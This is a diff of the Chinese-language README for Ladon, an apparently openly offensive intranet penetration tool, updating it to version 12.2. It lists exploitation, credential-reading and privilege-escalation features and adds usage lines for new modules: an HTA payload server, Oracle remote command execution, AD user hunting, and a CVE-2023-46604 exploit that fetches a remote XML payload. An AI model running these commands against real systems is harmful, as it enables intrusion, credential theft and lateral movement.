@@ -1,8 +1,8 @@
-## Ladon 12.0 20231201
+## Ladon 12.2 20231215
 ![](https://k8gege.github.io/k8img/Ladon/Dragon.jpg)
 
 [![Author](https://img.shields.io/badge/Author-k8gege-blueviolet)](https://github.com/k8gege) 
-[![Ladon](https://img.shields.io/badge/Ladon-12.0-yellowgreen)](https://github.com/k8gege/Ladon) 
+[![Ladon](https://img.shields.io/badge/Ladon-12.2-yellowgreen)](https://github.com/k8gege/Ladon) 
 [![Bin](https://img.shields.io/badge/Ladon-Bin-ff69b4)](https://github.com/k8gege/Ladon/releases) 
 [![GitHub issues](https://img.shields.io/github/issues/k8gege/Ladon)](https://github.com/k8gege/Ladon/issues) 
 [![Github Stars](https://img.shields.io/github/stars/k8gege/Ladon)](https://github.com/k8gege/Ladon) 
@@ -16,7 +16,7 @@
 
 ### 程序简介
 
-Ladon大型内网渗透\域渗透\横向工具，可PowerShell模块化、可CS插件化、可内存加载，无文件扫描。含端口扫描、服务识别、网络资产探测、密码审计、高危漏洞检测、漏洞利用、密码读取以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描等。12.0版本内置256功能模块,网络资产探测模块30+协议(ICMP\NBT\DNS\MAC\SMB\WMI\SSH\HTTP\HTTPS\Exchange\mssql\FTP\RDP)以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、交换机、数据库、打印机等信息，高危漏洞检测16+包含Cisco、Zimbra、Exchange、DrayTek、MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列、Printer等，密码审计25+含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(smbexec/wmiexe/psexec/atexec/sshexec/webshell),Web指纹识别模块可识别135+（Web应用、中间件、脚本类型、页面类型）等，本地提权21+含SweetPotato\BadPotato\EfsPotato\BypassUAC,可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。
+Ladon大型内网渗透\域渗透\横向工具，可PowerShell模块化、可CS插件化、可内存加载，无文件扫描。含端口扫描、服务识别、网络资产探测、密码审计、高危漏洞检测、漏洞利用、密码读取以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描等。12.2版本内置262功能模块,网络资产探测模块30+协议(ICMP\NBT\DNS\MAC\SMB\WMI\SSH\HTTP\HTTPS\Exchange\mssql\FTP\RDP)以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、交换机、数据库、打印机等信息，高危漏洞检测16+包含Cisco、Zimbra、Exchange、DrayTek、MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列、Printer等，密码审计25+含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(smbexec/wmiexe/psexec/atexec/sshexec/webshell),Web指纹识别模块可识别135+（Web应用、中间件、脚本类型、页面类型）等，本地提权21+含SweetPotato\BadPotato\EfsPotato\BypassUAC,可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。
 
 ### 使用简单
 
@@ -1805,6 +1805,47 @@ Ladon CVE-2023-46604 -i 192.168.1.8 -u http://192.168.1.1/poc.xml
        Ladon DomainLog -h ip -u username -p password -d 7 -f user -o C:\path\res
 ult.txt
 ```
+
+
+##### 257 检测用户是否Lotus管理员
+```Bash	
+Ladon LotusAdmin http://192.168.1.1
+Ladon LotusAdmin http://192.168.1.1/adm.nsf
+```
+
+##### 258 HTA服务器 一键启动 访问DOC也能执行HTA
+```Bash
+Ladon HtaSer
+Ladon HtaSer 8080
+```
+
+##### 259 ConfVer ConfluenceVer探测Confluence版本
+```Bash	
+Ladon 192.168.1.8/24 ConfVer
+Ladon http://192.168.1.8:8080 ConfVer
+Ladon url.txt ConfVer
+```
+
+##### 260 FindAD 可用于查找活动目录用户登陆的位置、枚举域用户
+```Bash	
+Ladon FindAD <parameters>
+Ladon pveFindADUser <parameters>
+```
+
+##### 261 Oracle数据库远程提权工具 官方驱动>=.net 4.8
+```Bash	
+Ladon OracleCmd2 192.168.1.8 1521 orcl admin 123456 whoami
+```
+
+
+##### 262 Oracle数据库远程提权工具 3种方法一键提权
+```Bash	
+Ladon OracleCmd 192.168.1.8 1521 orcl admin 123456 m1 whoami
+Ladon OracleCmd 192.168.1.8 1521 orcl admin 123456 m2 whoami
+Ladon OracleCmd 192.168.1.8 1521 orcl admin 123456 m3 whoami
+```
+
+
 
 =======================================================
 
